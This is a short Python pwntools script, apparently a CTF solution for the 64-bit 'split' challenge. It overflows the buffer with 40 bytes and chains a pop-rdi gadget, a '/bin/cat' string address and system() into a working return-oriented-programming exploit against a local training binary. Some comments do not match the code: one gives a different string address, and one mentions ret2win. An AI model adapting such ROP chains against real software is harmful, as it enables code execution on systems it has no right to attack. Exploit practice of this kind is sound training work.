#!/usr/bin/env python

# Solución para versión de 64 bits.
from pwn import *

# RIP offset is at 40
rop = b"A" * 40

# 0x00400883 <- ROP (pop rdi + ret) Encontrado con r2 -> /R pop rdi
# 0x00601061 <- string (/bin/cat)
# 0x004005e0 <- System()
rop += p64(0x00400883) + p64(0x00601060) + p64(0x004005e0)

# Start process and send rop chain
e = process('./split')
print(e.recv())
e.sendline(rop)

# Print output of ret2win()
print(e.recvall())